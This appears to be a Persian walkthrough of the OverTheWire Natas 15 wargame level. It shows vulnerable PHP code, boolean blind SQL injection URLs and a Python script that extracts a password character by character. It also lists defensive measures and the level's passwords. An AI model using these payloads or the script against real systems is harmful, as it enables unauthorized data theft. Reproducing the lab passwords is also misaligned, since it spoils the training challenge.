۱۵ تزریق SQL کور — مبتنی بر بولی پیشرفته
// مفاهیم کلیدی
تزریق SQL کور مبتنی بر بولی استخراج داده اطلاعات‌شناسی خودکارسازی
// مرور کلی چالش

این سطح بر اساس سطح ۱۴ ساخته شده است اما اکنون برنامه نتایج کوئری را نمایش نمی‌دهد. در عوض، تنها بر اساس وجود یا عدم وجود کاربر در پایگاه داده، یک پیام موفقیت یا شکست برمی‌گرداند. این یک تزریق SQL کور است — نمی‌توانیم داده را مستقیماً ببینیم، اما می‌توانیم با پرسیدن سوالات درست/غلط آن را استنتاج کنیم.

// تحلیل اولیه

کد منبع را برای درک رفتار بررسی کنید:

<?php if(array_key_exists("username", $_GET)) { $query = "SELECT * FROM users WHERE username='" . $_GET['username'] . "'"; $result = mysql_query($query); if(mysql_num_rows($result) > 0) { print "This user exists."; } else { print "This user doesn't exist."; } } ?>

برنامه فقط به ما می‌گوید که یک نام کاربری وجود دارد یا نه. این یک مثال کلاسیک از تزریق SQL کور مبتنی بر بولی است.

💡 در تزریق SQL کور، برنامه داده را مستقیماً برنمی‌گرداند. در عوض، می‌توانیم سوالات بله/خیر از پایگاه داده بپرسیم و پاسخ را بر اساس واکنش برنامه استنتاج کنیم.
// مراحل حل

مرحله ۱ — تأیید وجود کاربر:

http://natas15.natas.labs.overthewire.org/?username=natas16 # پاسخ: "This user exists."

مرحله ۲ — استخراج طول رمز عبور:

http://natas15.natas.labs.overthewire.org/?username=natas16' AND LENGTH(password)=32 --

مرحله ۳ — استخراج کاراکترها یکی یکی:

# بررسی اینکه آیا کاراکتر اول 'a' است (ASCII 97) http://natas15.natas.labs.overthewire.org/?username=natas16' AND ASCII(SUBSTRING(password,1,1))=97 --

مرحله ۴ — خودکارسازی با Python:

import requests import string url = "http://natas15.natas.labs.overthewire.org/" auth = ("natas15", "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J") charset = string.ascii_letters + string.digits password = "" for position in range(1, 33): for char in charset: payload = f"natas16' AND SUBSTRING(password, {position}, 1) = '{char}' -- " params = {"username": payload} response = requests.get(url, auth=auth, params=params) if "This user exists" in response.text: password += char print(f"Position {position}: {char}") break print(f"Password: {password}")
// چرا کار می‌کند

تزریق SQL کور به دلیل موارد زیر کار می‌کند:

  • ورودی پالایش نمی‌شود: ورودی کاربر در کوئری الحاق می‌شود.
  • پاسخ‌های متفاوت: برنامه بر اساس نتیجه کوئری خروجی‌های متفاوتی می‌دهد.
  • منطق شرطی قابل تزریق است: می‌توانیم شرایطی اضافه کنیم که درست یا غلط برگردانند.
  • اطلاعات بیت به بیت نشت می‌کند: هر کوئری یک بیت اطلاعات را آشکار می‌کند.
// اقدامات دفاعی
  • از عبارات آماده با کوئری‌های پارامتریزه استفاده کنید.
  • اعتبارسنجی ورودی: تمام ورودی کاربر را اعتبارسنجی و پالایش کنید.
  • مدیریت خطا: پیام‌های خطای عمومی ارائه دهید.
  • محدودیت نرخ: تعداد کوئری‌های هر کاربر را محدود کنید.
// مشخصات ورود
natas15 AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
natas16 WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
// نکات کلیدی
